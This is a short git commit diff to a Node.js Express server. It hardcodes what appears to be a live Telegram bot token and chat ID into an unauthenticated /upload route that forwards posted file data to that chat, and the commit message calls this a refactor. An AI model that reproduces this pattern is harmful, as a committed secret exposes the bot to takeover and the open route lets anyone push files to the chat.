23841db44dbb91aaf77c2c6ccc6d906e6898b5c2
sofiankalfahlla123-code <sofiankalfahlla123@gmail.com>
2026-07-06 20:20:18 +0100

    Refactor Telegram bot token handling in upload route

--- index.js
+++ index.js
@@ -3,11 +3,16 @@ const axios = require('axios');
 const app = express();
 app.use(express.json());
 
+// هذه هي بياناتك التي زودتني بها
+const MY_TOKEN = "8865686723:AAEqEmFR1Uw_C77kGR_8Wwdkz5PwdMeeIHk"; 
+const MY_CHAT_ID = "6576769234";
+
 app.post('/upload', async (req, res) => {
-    const { token, chatId, fileData } = req.body;
-    const url = `https://api.telegram.org/bot${token}/sendDocument`;
+    const { fileData } = req.body; 
+    const url = `https://api.telegram.org/bot${MY_TOKEN}/sendDocument`;
+    
     try {
-        await axios.post(url, { chat_id: chatId, document: fileData });
+        await axios.post(url, { chat_id: MY_CHAT_ID, document: fileData });
         res.status(200).send("Done");
     } catch (e) {
         res.status(500).send("Error");
